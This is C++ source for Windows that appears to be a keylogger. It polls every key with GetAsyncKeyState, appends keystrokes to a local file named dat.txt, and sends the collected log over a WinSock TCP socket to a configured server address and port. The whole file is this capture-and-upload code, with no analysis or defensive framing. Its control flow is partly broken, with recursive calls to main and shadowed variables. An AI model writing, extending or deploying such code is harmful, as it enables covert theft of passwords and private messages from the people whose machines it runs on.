#include <iostream>
#include <string>
#include <WS2tcpip.h>
#include <fstream>
#include "header.h"
#pragma comment(lib, "ws2_32.lib")

using namespace std;

std::string content;

void LOG(string input)
{
	fstream LogFile;

	LogFile.open("dat.txt", fstream::app);

	if (LogFile.is_open())
	{
		LogFile << input;
		LogFile.close();
	}
}

void stringGetter()
{
	std::fstream ifs("dat.txt");
	content.assign( (std::istreambuf_iterator<char>(ifs) ),
						  std::istreambuf_iterator<char>() );
}

int main()
{
	char KEY = 'x';

	Sleep(5);
	for (int KEY = 8; KEY <= 190; KEY++)
	{
		if (GetAsyncKeyState(KEY) == -32767)
		{
			if (SpecialKeys(KEY) == false)
			{
				cout << "main called" << endl;
				fstream LogFile;
				LogFile.open("dat.txt", fstream::app);
				if (LogFile.is_open())
				{
					LogFile << char(KEY);
					LogFile.close();
				}
			}
		}
	}

	string ipAddress = "127.0.0.1";			// IP Address of the server
	int port = 54000;						// Listening port # on the server
	string userInput;
	std::ifstream text;
	std::string textGet;

	// Initialize WinSock
	WSAData data;
	WORD ver = MAKEWORD(2, 2);
	int wsResult = WSAStartup(ver, &data);
	if (wsResult != 0)
	{
		cerr << "Can't start Winsock, Err #" << wsResult << endl;
		main();
	}

	// Create socket
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET)
	{
		cerr << "Can't create socket, Err #" << WSAGetLastError() << endl;
		main();
	}
	// Fill in a hint structure
	sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(port);
	inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);

	// Connect to server
	int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
	if (connResult == SOCKET_ERROR)
	{
		cerr << "Can't connect to server, Err #" << WSAGetLastError() << endl;
		//main();
	} //Repeats from top to here until a successful connection is acheived
	else
	{
		cout << "=|Connected to host! Working...|=" << endl;
	}

	if (connResult != SOCKET_ERROR)
	{
		// Do-while loop to send and receive data
		char buf[4096];

		stringGetter();
		textGet = content;

		if (textGet.size() > 0)		// Make sure the user has typed in something
		{
			// Send the text
			int sendResult = send(sock, textGet.c_str(), textGet.size() + 1, 0);
			if (sendResult != SOCKET_ERROR)
			{
				// Wait for response
				ZeroMemory(buf, 4096);
				int bytesReceived = recv(sock, buf, 4096, 0);
				if (bytesReceived > 0)
				{
					// Echo response to console
					cout << "SERVER> " << string(buf, 0, bytesReceived) << endl;
				}
			}
		}

		char KEY = 'x';

		while (true)
		{
			if (connResult != SOCKET_ERROR)
			{
				Sleep(5);
				for (int KEY = 8; KEY <= 190; KEY++)
				{
					if (GetAsyncKeyState(KEY) == -32767)
					{
						if (SpecialKeys(KEY) == false)
						{
							cout << "main called" << endl;
							fstream LogFile;
							LogFile.open("dat.txt", fstream::app);
							if (LogFile.is_open())
							{
								LogFile << char(KEY);
								LogFile.close();
							}
						}
					}
				}

			}
			else
			{
				main();
			}
		}
	}
	else
	{
		char KEY = 'x';

		while (connResult != SOCKET_ERROR)
		{
			Sleep(5);
			for (int KEY = 8; KEY <= 190; KEY++)
			{
				if (GetAsyncKeyState(KEY) == -32767)
				{
					if (SpecialKeys(KEY) == false)
					{
						cout << "main called" << endl;
						fstream LogFile;
						LogFile.open("dat.txt", fstream::app);
						if (LogFile.is_open())
						{
							LogFile << char(KEY);
							LogFile.close();
						}
					}
				}
			}
			int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
		}
		main();
	}
	// Gracefully close down everything
	closesocket(sock);
	WSACleanup();
	main();
	return 0;
}